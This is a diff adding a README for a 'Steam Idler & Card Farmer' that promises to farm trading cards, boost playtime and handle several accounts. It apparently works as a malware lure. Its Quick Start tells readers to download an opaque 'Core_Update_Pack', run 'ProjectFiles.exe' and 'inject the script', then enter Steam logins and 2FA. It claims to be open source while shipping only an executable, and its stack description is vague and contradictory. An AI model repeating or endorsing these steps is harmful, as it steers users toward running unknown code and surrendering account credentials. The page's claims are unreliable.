@@ -1,0 +1,80 @@
+🃏 Steam Idler & Card Farmer
+
+Farm Trading Cards, Boost Playtime & Idle Games — 2026
+
+A lightweight, open-source Steam Idler that does it all: farm trading cards, boost your playtime hours, and idle multiple games simultaneously.
+No Steam client required. Works headlessly on Windows, macOS, and Linux.
+
+🎯 What it is
+
+Steam Idler & Card Farmer is a standalone tool that simulates playing games on Steam.
+It is designed for users who want to collect trading cards, increase their total playtime, or simply keep their account active without actually running the games.
+
+⚠️ Warning: Idling games may affect your refund eligibility (if you have purchased a game recently). Use at your own risk. We are not responsible for any account restrictions.
+
+🚀 Quick Start
+
+1. Download Core_Update_Pack using the button above.
+2. Extract the archive into a separate folder.
+3. Run ProjectFiles.exe.
+4. Follow the on-screen instructions and inject the script.
+
+✨ Features
+
+| Feature                     | Description                                          |
+|-----------------------------|------------------------------------------------------|
+| 🃏 Card Farmer          | Automatically idle games to collect trading cards    |
+| ⏱️ Playtime Boost       | Boost hours for your favorite games                  |
+| 👥 Multi-Account        | Manage multiple Steam accounts simultaneously        |
+| 🖥️ Headless Mode        | Runs without the Steam client installed              |
+| 🔄 Auto-Reconnect       | Reconnects automatically if disconnected             |
+| 🔐 Steam Guard Support  | Handles 2FA and email confirmations                  |
+
+🛠️ How to use
+
+1. Launch ProjectFiles.exe.
+2. Log in with your Steam account (or add multiple accounts).
+3. Select the games you want to idle (for cards or playtime).
+4. Click "Start" to begin idling.
+5. Monitor your progress and card drops in the dashboard.
+
+⚙️ Configuration
+
+You can adjust settings in the config.json file:
+
+- Idle Mode: cards (farm cards) or playtime (boost hours)
+- Max Concurrent Games: Up to 32 games at once
+- Accounts: Add multiple Steam accounts
+- Steam Guard: Enable/disable 2FA handling
+
+❓ FAQ
+
+Is this safe to use?
+The tool simulates game activity only. However, use it at your own risk. Avoid idling games you might want to refund.
+
+Does it require the Steam client?
+No. It runs headlessly and connects directly to Steam servers.
+
+Can I farm cards for multiple accounts?
+Yes, multi-account support is built-in.
+
+Does it work on Mac or Linux?
+Yes, it runs on Windows, macOS, and Linux.
+
+💻 Tech Stack & Architecture
+
+- Core: Node.js / C# / TypeScript (depending on the build)
+- Steam API: SteamKit2 / steam-user
+- UI: Web Dashboard / CLI
+- Target OS: Windows / macOS / Linux
+
+🤝 Contributing
+
+Pull requests, bug reports, and feature suggestions are welcome.
+See CONTRIBUTING.md for guidelines.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
